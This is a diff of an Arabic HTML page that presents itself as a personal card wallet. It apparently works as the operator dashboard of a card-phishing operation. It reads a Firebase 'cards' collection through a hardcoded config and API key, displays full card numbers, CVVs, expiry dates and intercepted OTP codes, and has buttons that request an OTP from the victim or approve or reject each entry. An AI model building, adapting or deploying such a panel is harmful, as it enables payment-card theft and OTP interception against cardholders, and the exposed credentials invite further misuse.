@@ -1,262 +1,262 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محفظتي الرقمية - إدارة بطاقاتي</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;700&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محفظتي الرقمية - إدارة بطاقاتي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;700&display=swap');
 
-        :root { 
-            --primary: #1a56db; 
-            --bg: #f8fafc; 
-            --white: #ffffff; 
-            --dark: #1e293b;
-        }
+        :root { 
+            --primary: #1a56db; 
+            --bg: #f8fafc; 
+            --white: #ffffff; 
+            --dark: #1e293b;
+        }
 
-        body { 
-            font-family: 'Noto Sans Arabic', sans-serif; 
-            background-color: var(--bg); 
-            margin: 0; 
-            padding: 20px; 
-            color: var(--dark);
-        }
+        body { 
+            font-family: 'Noto Sans Arabic', sans-serif; 
+            background-color: var(--bg); 
+            margin: 0; 
+            padding: 20px; 
+            color: var(--dark);
+        }
 
-        .container { max-width: 900px; margin: 0 auto; }
+        .container { max-width: 900px; margin: 0 auto; }
 
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
 
-        header h1 { font-size: 24px; color: var(--dark); }
-        header i { font-size: 28px; color: var(--primary); }
+        header h1 { font-size: 24px; color: var(--dark); }
+        header i { font-size: 28px; color: var(--primary); }
 
-        /* تصميم البطاقة كبطاقة بنكية حقيقية */
-        .card-item {
-            background: var(--white);
-            border-radius: 20px;
-            margin-bottom: 25px;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            border: 1px solid #e2e8f0;
-            transition: transform 0.3s ease;
-        }
+        /* تصميم البطاقة كبطاقة بنكية حقيقية */
+        .card-item {
+            background: var(--white);
+            border-radius: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid #e2e8f0;
+            transition: transform 0.3s ease;
+        }
 
-        .card-visual {
-            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
-            padding: 25px;
-            color: white;
-            position: relative;
-            min-height: 160px;
-        }
+        .card-visual {
+            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
+            padding: 25px;
+            color: white;
+            position: relative;
+            min-height: 160px;
+        }
 
-        .card-visual .chip {
-            width: 40px;
-            height: 30px;
-            background: #facc15;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
+        .card-visual .chip {
+            width: 40px;
+            height: 30px;
+            background: #facc15;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
 
-        .card-visual .number {
-            font-family: 'Courier New', monospace;
-            font-size: 20px;
-            letter-spacing: 3px;
-            margin-bottom: 15px;
-            display: block;
-        }
+        .card-visual .number {
+            font-family: 'Courier New', monospace;
+            font-size: 20px;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            display: block;
+        }
 
-        .card-visual .footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-        }
+        .card-visual .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
 
-        .card-visual .holder { text-transform: uppercase; font-size: 14px; opacity: 0.8; }
-        .card-visual .type { font-weight: bold; font-style: italic; font-size: 20px; }
+        .card-visual .holder { text-transform: uppercase; font-size: 14px; opacity: 0.8; }
+        .card-visual .type { font-weight: bold; font-style: italic; font-size: 20px; }
 
-        .card-details {
-            padding: 20px;
-            background: #fdfdfd;
-            border-top: 1px solid #f1f5f9;
-        }
+        .card-details {
+            padding: 20px;
+            background: #fdfdfd;
+            border-top: 1px solid #f1f5f9;
+        }
 
-        .status-section {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
+        .status-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
 
-        .badge { 
-            padding: 6px 12px; 
-            border-radius: 50px; 
-            font-size: 12px; 
-            font-weight: bold; 
-        }
+        .badge { 
+            padding: 6px 12px; 
+            border-radius: 50px; 
+            font-size: 12px; 
+            font-weight: bold; 
+        }
 
-        .status-pending { background: #fef3c7; color: #92400e; }
-        .status-otp_required { background: #dbeafe; color: #1e40af; border: 1px solid #bfdbfe; }
-        .status-otp_sent { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
-        .status-success { background: #ecfdf5; color: #065f46; }
+        .status-pending { background: #fef3c7; color: #92400e; }
+        .status-otp_required { background: #dbeafe; color: #1e40af; border: 1px solid #bfdbfe; }
+        .status-otp_sent { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
+        .status-success { background: #ecfdf5; color: #065f46; }
 
-        .otp-box {
-            background: #fffbeb;
-            border: 2px dashed #f59e0b;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 10px 0;
-            text-align: center;
-            font-weight: bold;
-            color: #b45309;
-            font-size: 18px;
-        }
+        .otp-box {
+            background: #fffbeb;
+            border: 2px dashed #f59e0b;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+            color: #b45309;
+            font-size: 18px;
+        }
 
-        .actions {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-        }
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
 
-        .btn {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: 0.2s;
-        }
+        .btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: 0.2s;
+        }
 
-        .btn-confirm { background: #10b981; color: white; }
-        .btn-otp { background: #3b82f6; color: white; }
-        .btn-cancel { background: #ef4444; color: white; }
-        .btn-delete { background: #64748b; color: white; }
-        .btn:hover { opacity: 0.9; transform: translateY(-1px); }
+        .btn-confirm { background: #10b981; color: white; }
+        .btn-otp { background: #3b82f6; color: white; }
+        .btn-cancel { background: #ef4444; color: white; }
+        .btn-delete { background: #64748b; color: white; }
+        .btn:hover { opacity: 0.9; transform: translateY(-1px); }
 
-        .empty-msg { text-align: center; padding: 50px; color: #94a3b8; }
-    </style>
+        .empty-msg { text-align: center; padding: 50px; color: #94a3b8; }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div>
-                <h1>بطاقاتي المصرفية</h1>
-                <p style="color: #64748b; margin: 0;">إدارة وتأكيد عمليات الدفع الخاصة بي</p>
-            </div>
-            <i class="fa-solid fa-wallet"></i>
-        </header>
+    <div class="container">
+        <header>
+            <div>
+                <h1>بطاقاتي المصرفية</h1>
+                <p style="color: #64748b; margin: 0;">إدارة وتأكيد عمليات الدفع الخاصة بي</p>
+            </div>
+            <i class="fa-solid fa-wallet"></i>
+        </header>
 
-        <div id="cards-list">
-            <div class="empty-msg">جاري مزامنة بيانات محفظتك...</div>
-        </div>
-    </div>
+        <div id="cards-list">
+            <div class="empty-msg">جاري مزامنة بيانات محفظتك...</div>
+        </div>
+    </div>
 
 <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-    import { getFirestore, collection, query, orderBy, onSnapshot, doc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+    import { getFirestore, collection, query, orderBy, onSnapshot, doc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
-        authDomain: "vasa-a14ca.firebaseapp.com",
-        projectId: "vasa-a14ca",
-        storageBucket: "vasa-a14ca.firebasestorage.app",
-        messagingSenderId: "1083668938512",
-        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
-        measurementId: "G-1ESJ0J0TZW"
-    };
+    const firebaseConfig = {
+        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
+        authDomain: "vasa-a14ca.firebaseapp.com",
+        projectId: "vasa-a14ca",
+        storageBucket: "vasa-a14ca.firebasestorage.app",
+        messagingSenderId: "1083668938512",
+        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
+        measurementId: "G-1ESJ0J0TZW"
+    };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-    window.changeStatus = async (id, newStatus) => {
-        try {
-            await updateDoc(doc(db, "cards", id), { status: newStatus });
-        } catch (e) { console.error(e); }
-    };
+    window.changeStatus = async (id, newStatus) => {
+        try {
+            await updateDoc(doc(db, "cards", id), { status: newStatus });
+        } catch (e) { console.error(e); }
+    };
 
-    window.deleteCard = async (id) => {
-        if(confirm('هل تريد إزالة هذه البطاقة من محفظتك؟')) await deleteDoc(doc(db, "cards", id));
-    };
+    window.deleteCard = async (id) => {
+        if(confirm('هل تريد إزالة هذه البطاقة من محفظتك؟')) await deleteDoc(doc(db, "cards", id));
+    };
 
-    const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
-    onSnapshot(q, (snap) => {
-        const container = document.getElementById('cards-list');
-        container.innerHTML = '';
-        
-        if (snap.empty) {
-            container.innerHTML = '<div class="empty-msg">لا توجد بطاقات في محفظتك حالياً.</div>';
-            return;
-        }
+    const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
+    onSnapshot(q, (snap) => {
+        const container = document.getElementById('cards-list');
+        container.innerHTML = '';
+        
+        if (snap.empty) {
+            container.innerHTML = '<div class="empty-msg">لا توجد بطاقات في محفظتك حالياً.</div>';
+            return;
+        }
 
-        snap.forEach(d => {
-            const item = d.data();
-            const date = item.createdAt ? item.createdAt.toDate().toLocaleDateString('ar-EG') : '...';
-            const statusNames = {
-                'pending': 'قيد المراجعة',
-                'otp_required': 'مطلوب تأكيد الرمز',
-                'otp_sent': 'تم استلام الرمز',
-                'success': 'عملية مكتملة',
-                'error': 'عملية مرفوضة'
-            };
+        snap.forEach(d => {
+            const item = d.data();
+            const date = item.createdAt ? item.createdAt.toDate().toLocaleDateString('ar-EG') : '...';
+            const statusNames = {
+                'pending': 'قيد المراجعة',
+                'otp_required': 'مطلوب تأكيد الرمز',
+                'otp_sent': 'تم استلام الرمز',
+                'success': 'عملية مكتملة',
+                'error': 'عملية مرفوضة'
+            };
 
-            container.innerHTML += `
-                <div class="card-item">
-                    <div class="card-visual">
-                        <div class="chip"></div>
-                        <span class="number">${item.cardNumber || '**** **** **** ****'}</span>
-                        <div class="footer">
-                            <span class="holder">${item.cardHolder || 'اسم صاحب البطاقة'}</span>
-                            <span class="type">${(item.cardType || 'Visa').toUpperCase()}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="card-details">
-                        <div class="status-section">
-                            <span class="badge status-${item.status}">${statusNames[item.status] || 'حالة غير معروفة'}</span>
-                            <small style="color:#64748b;">تاريخ الإضافة: ${date}</small>
-                        </div>
+            container.innerHTML += `
+                <div class="card-item">
+                    <div class="card-visual">
+                        <div class="chip"></div>
+                        <span class="number">${item.cardNumber || '**** **** **** ****'}</span>
+                        <div class="footer">
+                            <span class="holder">${item.cardHolder || 'اسم صاحب البطاقة'}</span>
+                            <span class="type">${(item.cardType || 'Visa').toUpperCase()}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="card-details">
+                        <div class="status-section">
+                            <span class="badge status-${item.status}">${statusNames[item.status] || 'حالة غير معروفة'}</span>
+                            <small style="color:#64748b;">تاريخ الإضافة: ${date}</small>
+                        </div>
 
-                        <div style="font-size: 14px; margin-bottom: 10px;">
-                            <span>تاريخ الانتهاء: <b>${item.expiryDate}</b></span> | 
-                            <span>الرمز (CVV): <b>${item.cvv}</b></span>
-                        </div>
+                        <div style="font-size: 14px; margin-bottom: 10px;">
+                            <span>تاريخ الانتهاء: <b>${item.expiryDate}</b></span> | 
+                            <span>الرمز (CVV): <b>${item.cvv}</b></span>
+                        </div>
 
-                        ${item.status === 'otp_sent' ? `
-                            <div class="otp-box">
-                                <i class="fa-solid fa-lock-open"></i> رمز التحقق: ${item.otp}
-                            </div>
-                        ` : ''}
+                        ${item.status === 'otp_sent' ? `
+                            <div class="otp-box">
+                                <i class="fa-solid fa-lock-open"></i> رمز التحقق: ${item.otp}
+                            </div>
+                        ` : ''}
 
-                        <div class="actions">
-                            <button class="btn btn-confirm" onclick="changeStatus('${d.id}', 'success')" title="اعتماد">
-                                <i class="fa-solid fa-check"></i> تأكيد
-                            </button>
-                            <button class="btn btn-otp" onclick="changeStatus('${d.id}', 'otp_required')" title="طلب رمز">
-                                <i class="fa-solid fa-key"></i> طلب رمز
-                            </button>
-                            <button class="btn btn-cancel" onclick="changeStatus('${d.id}', 'error')" title="إلغاء">
-                                <i class="fa-solid fa-xmark"></i> رفض
-                            </button>
-                            <button class="btn btn-delete" onclick="deleteCard('${d.id}')" title="حذف">
-                                <i class="fa-solid fa-trash"></i>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            `;
-        });
-    });
+                        <div class="actions">
+                            <button class="btn btn-confirm" onclick="changeStatus('${d.id}', 'success')" title="اعتماد">
+                                <i class="fa-solid fa-check"></i> تأكيد
+                            </button>
+                            <button class="btn btn-otp" onclick="changeStatus('${d.id}', 'otp_required')" title="طلب رمز">
+                                <i class="fa-solid fa-key"></i> طلب رمز
+                            </button>
+                            <button class="btn btn-cancel" onclick="changeStatus('${d.id}', 'error')" title="إلغاء">
+                                <i class="fa-solid fa-xmark"></i> رفض
+                            </button>
+                            <button class="btn btn-delete" onclick="deleteCard('${d.id}')" title="حذف">
+                                <i class="fa-solid fa-trash"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+        });
+    });
 </script>
 </body>
 </html>
